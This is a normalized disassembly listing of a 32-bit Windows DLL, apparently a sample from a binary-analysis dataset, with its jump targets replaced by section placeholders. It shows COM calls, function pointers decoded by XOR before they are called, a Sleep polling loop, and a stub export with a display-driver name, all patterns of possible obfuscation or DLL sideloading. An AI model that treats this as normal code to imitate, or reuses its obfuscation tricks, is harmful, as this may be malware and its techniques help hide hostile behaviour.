mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0x3
inc eax
mov [ ebp - 0x54 ] cx
mov ecx eax
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov esi [ edx ]
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x50 ]
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x48 ]
push edx
mov edx [ esi + 0x20 ]
mov [ eax + 0xc ] ecx
call edx
mov esi eax
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x4 ] 0xffffffff
call [ VariantClear@IAT ]
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x34 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x4c ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov esi eax
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x3c ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
lea ecx [ ecx ]
mov eax edi
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
cmp eax ebx
jl r-xdata
lea edi [ eax + 0x1 ]
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x20 ]
call eax
cmp eax ebx
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
cmp [ ebp - 0x40 ] ebx
jne r-xdata
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ebx
mov ecx [ eax ]
push edx
mov esi eax
push eax
mov eax [ ecx + 0x28 ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
push ecx
push edx
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
push ebx
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10042ef0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi ]
mov eax [ esi * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
mov bl 0x38
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
mov ecx [ ebp - 0x4 ]
lea edx [ esi - 0x1 ]
mov [ ebp - 0x4 ] ecx
cmp edx 0x11
ja r-xdata
cmp esi 0x6
je r-xdata
lea eax [ ebp - 0x4 ]
lea ecx [ ebp + 0x8 ]
call sub_100523b0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
call [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
sub_10042f60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx edi
ja r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
test edi edi
je r-xdata
push r--data
call sub_10030594
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
lea ebx [ eax + edi ]
cmp ebx 0x7ffffffe
jbe r-xdata
cmp edx 0x8
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
jae r-xdata
push r--data
call sub_10030594
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
test ebx ebx
jne r-xdata
push eax
push ebx
mov ecx esi
call sub_10071bf0
test ebx ebx
je r-xdata
cmp edx 0x8
jb r-xdata
mov ebx [ esi + 0x10 ]
lea ecx [ ecx + ebx * 2 ]
cmp ecx eax
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp ecx 0x8
jb r-xdata
mov ecx esi
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_10063e80
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ esi ]
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_10063e80
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
push edx
add edi edi
push ecx
add eax edi
push eax
call sub_10021370
add esp 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
xor edx edx
mov [ eax + ebx * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + ebx * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
sub_100430aa
mov edi edi
push ebp
mov ebp esp
mov dl [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dl
jg r-xdata
cmp [ ebp + 0x14 ] dl
jg r-xdata
movsx ecx [ ebp + 0x10 ]
movsx eax dl
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dl
jg r-xdata
movsx ecx [ ebp + 0x14 ]
movsx eax dl
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movsx ecx [ ebp + 0x18 ]
movsx eax dl
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_10043100
push ebp
mov ebp esp
call sub_10006e80
test eax eax
jne r-xdata
call [ ebp + 0x8 ]
pop ebp
retn 0x4
push esi
mov esi [ Sleep@IAT ]
push 0x2710
call esi
call sub_10006e80
test eax eax
je r-xdata
pop esi
sub_1004312b
push 0x8
mov eax sub_10085dd3
call sub_100259bb
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100575c5
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1004ab38
push eax
call sub_10003340
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1004a1ad
push eax
call sub_10003340
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1005a906
mov [ esi + 0x10 ] eax
call sub_10008d33
retn 0x4
sub_100431a2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10041241
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1005bae3
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10041241
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10041241
push 0x1
mov edi eax
call sub_10041241
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10040e4b
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
ADL_Display_ModeTimingOverride_Delete
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
xor eax eax
retn
sub_1004327d
push 0x198
mov eax sub_10085fe8
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1a0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x184 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10047742
pop ecx
lea ecx [ ebp - 0x198 ]
lea eax [ ebp - 0x19c ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_1005b959
pop ecx
lea ecx [ ebp - 0x19c ]
jmp r-xdata
mov ecx [ ebp - 0x17c ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_1002be90
and [ ebp - 0x38 ] 0x0
push 0xf
pop edi
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] 0x0
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x18c ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x17c ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x18c ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1004ca30
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov esi [ ebp - 0x1a0 ]
mov [ esi + 0x14 ] edi
lea eax [ ebp - 0x64 ]
xor edi edi
mov [ esi + 0x10 ] edi
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1003acf0
push edi
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10005b50
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov eax esi
call sub_100262c3
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x17c ]
cmp [ ebp - 0x161 ] 0x0
push 0xf
pop edi
je r-xdata
mov ecx [ ebp - 0x184 ]
lea eax [ ebp - 0x190 ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10022420
pop ecx
lea ecx [ ebp - 0x190 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_1002be90
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100332a0
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
push 0x2d
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_100502f0
mov ebx eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x184 ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ ebp - 0x17c ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
inc ebx
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_1002f75b
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
and [ ebp - 0x178 ] 0x0
mov ecx ebx
call [ eax + 0x1c ]
mov [ ebp - 0x180 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_10026407
cmp [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0xb
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
movzx eax [ esi + 0x5 ]
mov ecx [ edi + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
mov ecx esi
call sub_1001f91c
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001f91c
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x144 ]
push eax
call sub_1002f75b
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov bl al
test bl bl
je r-xdata
mov ecx [ ebp - 0x38 ]
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1005f5ef
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1004ca30
cmp [ esi + 0x4 ] al
jne r-xdata
cmp al [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_10005b50
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
mov bl al
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov al [ esi + 0x5 ]
cmp al [ ebx ]
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_10005b50
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1005f5ef
jmp r-xdata
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
call sub_1001fc54
or [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x10 ] ebx
jbe r-xdata
mov ecx esi
call sub_1005f5ef
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_1002f75b
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_1003acf0
push ebx
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
xor ebx ebx
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
xor edi edi
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xf0 ]
push eax
call sub_1001fc54
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10005b50
jmp r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
lea ecx [ ebp - 0x80 ]
jmp r-xdata
mov edi eax
sub edi [ ebp - 0x178 ]
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
cmp al [ edi ]
jne r-xdata
mov ecx esi
call sub_1001f91c
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_10005b50
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x30
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10042a70
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
inc edi
call sub_1005f5ef
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_10005b50
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ ebp - 0x188 ] al
push [ ebp - 0x188 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10042a70
mov ecx esi
call sub_1005f5ef
mov ecx esi
call sub_1001f91c
mov ecx esi
call sub_1005f5ef
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_1002f75b
mov edi [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_10005b50
cmp edi ebx
je r-xdata
mov ecx esi
call sub_1005f5ef
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x160 ]
push eax
call sub_1001fc54
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_1003acf0
push ebx
push 0x1
lea ecx [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x3
call sub_10005b50
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
mov eax [ ebp - 0x178 ]
cmp eax [ ebp - 0x180 ]
jge r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10005b50
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_1001fc54
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_10005b50
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_1001f91c
mov al [ esi + 0x5 ]
mov [ ebp - 0x194 ] al
push [ ebp - 0x194 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10042a70
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1005f5ef
push [ ebp - 0x16c ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi + 0x5 ]
mov [ ebp - 0x1a4 ] al
push [ ebp - 0x1a4 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10042a70
inc [ ebp - 0x178 ]
mov ecx esi
call sub_1001f91c
sub_10043bb1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x1c ]
movzx eax ax
retn
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_10043be2
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10043c70
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
